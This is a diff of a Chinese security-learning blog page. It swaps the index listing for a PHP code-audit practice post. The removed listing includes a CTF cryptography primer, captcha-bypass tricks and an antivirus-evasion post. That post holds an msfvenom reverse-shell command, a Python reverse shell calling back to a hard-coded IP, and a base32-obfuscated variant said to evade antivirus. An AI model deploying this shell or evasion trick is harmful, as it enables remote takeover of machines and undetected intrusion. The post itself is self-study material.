@@ -6,15 +6,83 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Solkatt的小窝</title>
+  <title>php代码审计练习 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="php代码审计练习challenge1 函数解析：bin2hex()：函数把 ASCII 字符的字符串转换为十六进制值。字符串可通过使用 pack() 函数再转换回去。 hex2bin() ：函数把十六进制值的字符串转换为 ASCII 字符。 strrev() ：函数反转字符串。 要想得到flag需要把字符串反解码，于是我们可以通过 12345678910&lt;?php$str &#x3D; &quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php代码审计练习">
+<meta property="og:url" content="http://example.com/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="php代码审计练习challenge1 函数解析：bin2hex()：函数把 ASCII 字符的字符串转换为十六进制值。字符串可通过使用 pack() 函数再转换回去。 hex2bin() ：函数把十六进制值的字符串转换为 ASCII 字符。 strrev() ：函数反转字符串。 要想得到flag需要把字符串反解码，于是我们可以通过 12345678910&lt;?php$str &#x3D; &quot;">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211103215838853.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211105152907290.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211105154500255.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211105155025686.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211105155051747.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211106145003873.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211106145414850.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211106151012148.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211106154316269.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211108150530545.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211108160719536.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211108163851742.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211108172723003.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211109105446641.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211109114011388.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211112131549771.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211112134552731.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211112134716833.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211113112234202.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211114115013539.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211115164644565.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211115180759434.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211117164731509.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211117164633177.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211117164708402.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211117165433901.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/1000580-20170504143503586-174730196.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/1000580-20170504143503992-1505308179.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/1000580-20170504143505086-1592155097.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211119162639542.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211120114602018.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211120114817399.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211120115456081.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211120120023520.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211122175241488.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211122180415260.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211122182914124.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211122183404226.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211124101319960.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211124102334621.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211124102819658.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211124102835276.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211125101325914.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211125102911032.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211125120046590.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211125120109939.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211125121120585.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211128165933519.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211130163151671.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211130173105095.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211130180448463.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211205165231239.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211205195654865.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211205200138454.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211205201007247.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211205201042356.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211205201227746.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211205201411953.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211205201513239.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211206194241343.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211206171232529.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211216110914512.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211216113843740.png">
+<meta property="article:published_time" content="2021-12-14T08:14:16.000Z">
+<meta property="article:modified_time" content="2022-01-17T05:11:02.356Z">
 <meta property="article:author" content="Solkatt">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211103215838853.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -150,649 +218,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-php代码审计练习" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/17/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/17/hello-world/" class="archive-article-date">
-  	<time datetime="2022-01-16T17:06:15.405Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/17/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-初入免杀" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/">初入免杀</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/" class="archive-article-date">
-  	<time datetime="2022-01-16T14:26:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="杀毒软件的基本等级"><a href="#杀毒软件的基本等级" class="headerlink" title="杀毒软件的基本等级"></a>杀毒软件的基本等级</h1><p>首先要了解杀毒软件的定义等级如下：</p>
-<ol>
-<li>无害</li>
-<li>可疑</li>
-<li>确认为病毒</li>
-</ol>
-<p>我们需要把程序做到<code>无害</code>等级才能支撑我们的下一步动作</p>
-<h1 id="杀毒软件是如何进行识别病毒程序"><a href="#杀毒软件是如何进行识别病毒程序" class="headerlink" title="杀毒软件是如何进行识别病毒程序"></a>杀毒软件是如何进行识别病毒程序</h1><h2 id="静态识别："><a href="#静态识别：" class="headerlink" title="静态识别："></a>静态识别：</h2><p>杀软的大体查杀规则是基于文件hash值（整体hash或者片段hash等）、字符串特征、函数特征、api检测、敏感行为（如加、解密）行为检测等这些方面。对于静态检测主要的目的是在于绕过对文件哈希字符串导入API等特征来进行的。</p>
-<h2 id="动态识别："><a href="#动态识别：" class="headerlink" title="动态识别："></a>动态识别：</h2><p>动态识别常常是存在于静态分析之后，部分杀软会有沙盒。</p>
-<h3 id="沙盒："><a href="#沙盒：" class="headerlink" title="沙盒："></a>沙盒：</h3><p>沙盒又称为启发式查杀，通过模拟计算机的环境执行目标文件再观察特征行为。</p>
-<h3 id="沙盒模拟的常见特征："><a href="#沙盒模拟的常见特征：" class="headerlink" title="沙盒模拟的常见特征："></a>沙盒模拟的常见特征：</h3><ul>
-<li>内存较小：不影响计算机的正常运行</li>
-<li>时间较快：沙盒内置的时间速度比现实世界要快很多，因为它要提升查杀速度。</li>
-<li>进程或文件不完整：减少杀毒软件运行时对计算机的消耗。</li>
-<li>io设备的缺失:鼠标键盘等事件大部分沙盒都没有。</li>
-</ul>
-<h1 id="MSF生成的python木马源码分析"><a href="#MSF生成的python木马源码分析" class="headerlink" title="MSF生成的python木马源码分析"></a>MSF生成的python木马源码分析</h1><ol>
-<li>使用MSF生成python木马</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/shell_rever_tcp LHOST=101.34.214.7 LPORT=7777&gt;shell.php</span><br></pre></td></tr></table></figure>
-
-<p>用pycharm打开，源码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;aW1wb3J0IHNvY2tldCBhcyBzCmltcG9ydCBzdWJwcm9jZXNzIGFzIHIKc289cy5zb2NrZXQocy5BRl9JTkVULHMuU09DS19TVFJFQU0pCnNvLmNvbm5lY3QoKCcxMjEuMzguMjE0LjcnLDc3NzcpKQp3aGlsZSBUcnVlOgoJZD1zby5yZWN2KDEwMjQpCglpZiBsZW4oZCk9PTA6CgkJYnJlYWsKCXA9ci5Qb3BlbihkLHNoZWxsPVRydWUsc3RkaW49ci5QSVBFLHN0ZG91dD1yLlBJUEUsc3RkZXJyPXIuUElQRSkKCW89cC5zdGRvdXQucmVhZCgpK3Auc3RkZXJyLnJlYWQoKQoJc28uc2VuZChvKQo=&#x27;)[0]))</span><br></pre></td></tr></table></figure>
-
-<p>通过base64转码可以查看源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import socket as s</span><br><span class="line">import subprocess as r</span><br><span class="line">so=s.socket(s.AF_INET,s.SOCK_STREAM)</span><br><span class="line">so.connect((&#x27;121.38.214.7&#x27;,7777))</span><br><span class="line">while True:</span><br><span class="line">	d=so.recv(1024)</span><br><span class="line">	if len(d)==0:</span><br><span class="line">		break</span><br><span class="line">	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)</span><br><span class="line">	o=p.stdout.read()+p.stderr.read()</span><br><span class="line">	so.send(o)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过火绒可以直接查杀到是后门。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220116230328459.png" alt="image-20220116230328459"></p>
-<p>2.分析MSF源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import socket as s</span><br><span class="line">import subprocess as r</span><br><span class="line">so=s.socket(s.AF_INET,s.SOCK_STREAM)</span><br><span class="line">so.connect((&#x27;121.38.214.7&#x27;,7777))</span><br><span class="line">while True:</span><br><span class="line">	d=so.recv(1024)</span><br><span class="line">	if len(d)==0:</span><br><span class="line">		break</span><br><span class="line">	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)</span><br><span class="line">	o=p.stdout.read()+p.stderr.read()</span><br><span class="line">	so.send(o)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>发现它的主要机理是使用socket来与服务器建立连接。</p>
-<p><code>s.socket（s.AF_INET,s.SOCK_STREAM）</code>:服务器之间网络通信，并且使用流式socket(TCP是面向字节流的服务)。</p>
-<p><code>so.recv(1024)</code>:接受TCP套接字的数据。数据以字符串形式返回，后面跟的是最大数据量。</p>
-<p><code>subprocess</code>:subprocess模块允许我们启动一个新进程，并连接到它们的输入/输出/错误管道，从而获取返回值。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220116232605310.png" alt="image-20220116232605310"></p>
-<p>3.修改代码达到免杀效果</p>
-<p>通过上面的代码分析发现，代码使用了base64来进行解密最后来进行加密，那么我们可以换一种加密方式，这里就在shell修改成使用base32来解密。</p>
-<p>修改后代码如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(__import__(&#x27;base64&#x27;).b32decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;NFWXA33SOQQHG33DNNSXIIDBOMQHGCTJNVYG64TUEBZXKYTQOJXWGZLTOMQGC4ZAOIFHG3Z5OMXHG33DNNSXIKDTFZAUMX2JJZCVILDTFZJU6Q2LL5JVIUSFIFGSSCTTN4XGG33ONZSWG5BIFATTCMRRFYZTQLRSGE2C4NZHFQ3TONZXFEUQU53INFWGKICUOJ2WKOQKBFSD243PFZZGKY3WFAYTAMRUFEFAS2LGEBWGK3RIMQUT2PJQHIFASCLCOJSWC2YKBFYD24ROKBXXAZLOFBSCY43IMVWGYPKUOJ2WKLDTORSGS3R5OIXFASKQIUWHG5DEN52XIPLSFZIESUCFFRZXIZDFOJZD24ROKBEVARJJBIEW6PLQFZZXIZDPOV2C44TFMFSCQKJLOAXHG5DEMVZHELTSMVQWIKBJBIEXG3ZOONSW4ZBIN4UQ===&#x27;)[0]))</span><br></pre></td></tr></table></figure>
-
-<p>发现成功过检验：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220116234554219.png" alt="image-20220116234554219"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220116234923165.png" alt="image-20220116234923165"></p>
-<p>4.进行测试</p>
-<p>用虚拟机连接服务器看是否能连接：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220117001124114.png" alt="image-20220117001124114"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220117001100807.png" alt="image-20220117001100807"></p>
-<p>但是在尝试用一台真实电脑发现当输入命令的时候会报typeerror错误。最后判断是python3和2的版本问题。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ctf密码学" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/">ctf密码学</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/" class="archive-article-date">
-  	<time datetime="2022-01-11T14:54:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="键盘加密"><a href="#键盘加密" class="headerlink" title="键盘加密"></a>键盘加密</h1><h2 id="键盘布局加密："><a href="#键盘布局加密：" class="headerlink" title="键盘布局加密："></a>键盘布局加密：</h2><p>键盘布局加密基本上是脑洞题，通常都是一推无意义的字符，但是把字符在键盘上布局比划一下，就可以根据形状拼出相应字符。</p>
-<h2 id="键盘坐标加密："><a href="#键盘坐标加密：" class="headerlink" title="键盘坐标加密："></a>键盘坐标加密：</h2><p>键盘坐标加密主要是利用键盘上面的字母和数字行来加密，具体又有两种方法:</p>
-<ol>
-<li>以字母行所在的行号作为横坐标，数字所对应的列为纵坐标。</li>
-</ol>
-<p>eg：a:21 b:35</p>
-<ol start="2">
-<li>以数字所对应的列为横坐标，字母所在的行号为纵坐标。</li>
-</ol>
-<p>eg: a:21 b:53</p>
-<h1 id="brainfuck和Ook密码"><a href="#brainfuck和Ook密码" class="headerlink" title="brainfuck和Ook密码"></a>brainfuck和Ook密码</h1><p>brainfuck和ook主要用于对程序源代码进行加密，主要思想是将源码中的指令替换成其他的一些符号。</p>
-<p>对于这种加密方式，我们无需去探究其原理，认出来用工具就好了</p>
-<h2 id="bf密码用-gt-lt-八种符号来替换c语言的各种语法和命令。"><a href="#bf密码用-gt-lt-八种符号来替换c语言的各种语法和命令。" class="headerlink" title="bf密码用&gt; &lt; + - . , [ ]八种符号来替换c语言的各种语法和命令。"></a>bf密码用&gt; &lt; + - . , [ ]八种符号来替换c语言的各种语法和命令。</h2><h2 id="Ook密码由三种符号组成：Ook-、Ook？、Ook！"><a href="#Ook密码由三种符号组成：Ook-、Ook？、Ook！" class="headerlink" title="Ook密码由三种符号组成：Ook.、Ook？、Ook！"></a>Ook密码由三种符号组成：Ook.、Ook？、Ook！</h2><h1 id="替代密码"><a href="#替代密码" class="headerlink" title="替代密码"></a>替代密码</h1><p>替代密码是指先建立一个替换表，加密时将需要加密的明文依次通过查表，替换为相应的字符，明文字符被逐个替换后，生成无任何意义的字符串，即密文。</p>
-<p>在替代密码中，每个字母或每一组字母被另一个字母或另一组字母所取代。</p>
-<p>替代密码保留了明文符号的顺序，但是将明文伪装起来。</p>
-<h2 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h2><p>摩斯密码是一种早期的数字化通信形式，虽然由点<code>.</code>和横<code>-</code>两种不同于现代只使用0和1两种状态的二进制代码。所以认出来了用工具去解就好了。</p>
-<h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>凯撒密码是典型的替代密码，加密原理是把明文中的所有字母都在字母表中向前或者向后按照一个固定数目进行移位后替换成密文，而数字和非字母字符则保持不变。位移数就是凯撒密码的密钥。凯撒密码只有25种可能的密钥，当年凯撒用的密钥是3。</p>
-<h3 id="凯撒密码的加密和解密"><a href="#凯撒密码的加密和解密" class="headerlink" title="凯撒密码的加密和解密"></a>凯撒密码的加密和解密</h3><p>x代表明文，y代表密文，k代表密钥。</p>
-<p>加密：</p>
-<p>(x+k)%26</p>
-<p>解密：</p>
-<p>(y-k)%26</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-逻辑漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-12-28T03:35:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="验证码绕过，密码找回漏洞"><a href="#验证码绕过，密码找回漏洞" class="headerlink" title="验证码绕过，密码找回漏洞"></a>验证码绕过，密码找回漏洞</h1><h2 id="验证码绕过常见姿势"><a href="#验证码绕过常见姿势" class="headerlink" title="验证码绕过常见姿势"></a>验证码绕过常见姿势</h2><ol>
-<li><p>前端验证验证码，并没有后端验证，直接抓包然后进行跑数据包，反正没有验证码的阻碍。</p>
-</li>
-<li><p>验证码设置了但是并没有验证，乱输入验证码也能够成功的登录。</p>
-</li>
-<li><p>验证码可以重复使用。</p>
-</li>
-<li><p>验证码空值绕过，比如我们抓一个包，发现有验证码参数，但是我们去掉验证码的参数就可以绕过验证码机制。验证码就失败了。</p>
-</li>
-<li><p>验证码干扰过低，使用脚本识别。</p>
-</li>
-<li><p>验证码在直接在html里面输出。</p>
-</li>
-<li><p>验证码可控，比如他的验证码包含在url面，是一个url传参，我们可以把url设置定，那么验证码可设置。</p>
-</li>
-<li><p>验证码有规则，比如用时间戳的后6位。</p>
-</li>
-<li><p>万能验证码，验证码无论是什么，只要输入特定数字就可以直接绕过。</p>
-</li>
-<li><p>验证码有时候会在cookie里面，分析一下是不是存在验证码的参数。</p>
-</li>
-<li><p>图片验证码，类型太少，容易识别。</p>
-</li>
-<li><p>多次登录后才出现验证码绕过:</p>
-</li>
-<li><p>基于session</p>
-</li>
-<li><p>基于ip</p>
-</li>
-<li><p>基于用户</p>
-</li>
-</ol>
